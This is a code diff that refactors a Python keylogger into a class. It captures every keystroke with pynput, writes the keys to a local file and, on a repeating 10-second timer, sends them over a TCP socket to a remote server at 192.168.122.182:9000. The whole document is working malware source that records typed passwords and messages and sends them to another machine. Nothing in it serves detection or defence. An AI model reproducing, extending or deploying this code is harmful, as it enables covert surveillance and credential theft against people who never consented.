@@ -1,42 +1,51 @@
 import pynput.keyboard
 import socket
+import os
+import threading
 
-log = ""
+class Keylogger:
+    def __init__(self):
+        self.log = ""
 
-def on_press(key):
-    global log
-    try:
-        log += str(key.char)
-    except AttributeError:
-        if key == pynput.keyboard.Key.space:
-            log += " "
-        else:
-            log += f" {str(key)} "
-    print(f"Key pressed: {key}")
+    def append_to_log(self, string):
+        self.log += string
 
-def write_file(text):
-    with open("keylogs.txt", "a") as f:
-        f.write(text)
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        print(f"Key pressed: {current_key}")
+        self.append_to_log(current_key)
 
-def send_logs():
-    global log
-    server_ip = "192.168.122.182"
-    port = 9000
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect((server_ip, port))
-        s.sendall(log.encode())
-        print(f"Logs sent to {server_ip}:{port}")
-    except Exception as e:
-        print(f"Failed to send logs: {e}")
-    finally:
-        s.close()
+    def report(self):
+        with open("keylogs.txt", "w") as f:
+            f.write(self.log)
+        print("Log file updated")
+        self.send_data()
+        self.log = ""
+        timer = threading.Timer(10, self.report)
+        timer.start()
 
-with pynput.keyboard.Listener(on_press=on_press) as listener:
-    try:
-        listener.join()
-    except KeyboardInterrupt:
-        pass
+    def send_data(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("192.168.122.182", 9000))
+            s.send(self.log.encode())
+            print("Data sent to server")
+            s.close()
+        except Exception as e:
+            print(f"Failed to send data: {e}")
 
-write_file(log)
-send_logs()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.start()
